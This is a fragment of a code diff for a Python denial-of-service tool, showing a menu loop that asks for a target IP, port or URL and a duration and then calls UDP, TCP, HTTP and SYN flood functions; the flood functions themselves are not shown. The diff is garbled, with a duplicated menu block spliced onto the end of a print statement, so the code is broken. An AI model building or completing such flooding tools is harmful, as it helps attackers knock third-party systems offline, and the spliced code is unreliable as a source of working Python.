@@ -54,4 +54,24 @@ if __name__ == "__main__":
         elif choice == '5':
             break
         else:
+            print("Invalid choice. Please try again.")            port = input("Enter target port: ")
+            duration = input("Enter duration (seconds): ")
+            udp_flood(target, port, duration)
+        elif choice == '2':
+            target = input("Enter target IP: ")
+            port = input("Enter target port: ")
+            duration = input("Enter duration (seconds): ")
+            tcp_flood(target, port, duration)
+        elif choice == '3':
+            target = input("Enter target URL: ")
+            duration = input("Enter duration (seconds): ")
+            http_flood(target, duration)
+        elif choice == '4':
+            target = input("Enter target IP: ")
+            port = input("Enter target port: ")
+            duration = input("Enter duration (seconds): ")
+            syn_flood(target, port, duration)
+        elif choice == '5':
+            break
+        else:
             print("Invalid choice. Please try again.")
